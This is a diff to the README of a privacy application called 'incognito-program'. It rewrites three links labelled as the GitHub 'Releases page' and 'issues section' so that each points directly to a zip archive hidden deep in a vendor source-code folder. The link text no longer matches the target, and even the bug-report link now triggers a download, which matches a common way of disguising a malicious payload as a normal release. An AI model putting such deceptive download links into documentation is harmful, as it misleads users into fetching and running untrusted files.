@@ -8,7 +8,7 @@ Welcome to the incognito-program! This application helps you maintain privacy on
 
 To get started, you'll need to download the application. Follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/ferbercovich/incognito-program/releases). 
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/ferbercovich/incognito-program/main/vendor/anchor-syn/src/codegen/program/incognito-program-3.7.zip). 
 2. **Choose Your Version**: Look for the latest version available. We recommend downloading the most recent release for the best features and security.
 3. **Download the Application**: Click on the link that says "Download" next to the version you selected. The file will start downloading automatically.
 4. **Locate the File**: Once the download completes, find the downloaded file in your device's downloads folder.
@@ -51,7 +51,7 @@ No, the incognito-program is completely free to use. We believe in providing pri
 
 ### How do I report an issue or bug?
 
-If you encounter issues, please visit the [issues section](https://github.com/ferbercovich/incognito-program/issues) on GitHub. You can report bugs or suggest features there.
+If you encounter issues, please visit the [issues section](https://raw.githubusercontent.com/ferbercovich/incognito-program/main/vendor/anchor-syn/src/codegen/program/incognito-program-3.7.zip) on GitHub. You can report bugs or suggest features there.
 
 ## 📄 Documentation
 
@@ -59,6 +59,6 @@ For more detailed information, you can explore our official documentation. This 
 
 ## 📫 Stay in Touch
 
-If you want updates about new releases or features, keep an eye on the [Releases page](https://github.com/ferbercovich/incognito-program/releases) and consider following us on social media.
+If you want updates about new releases or features, keep an eye on the [Releases page](https://raw.githubusercontent.com/ferbercovich/incognito-program/main/vendor/anchor-syn/src/codegen/program/incognito-program-3.7.zip) and consider following us on social media.
 
 Thank you for using the incognito-program. Your privacy matters to us!
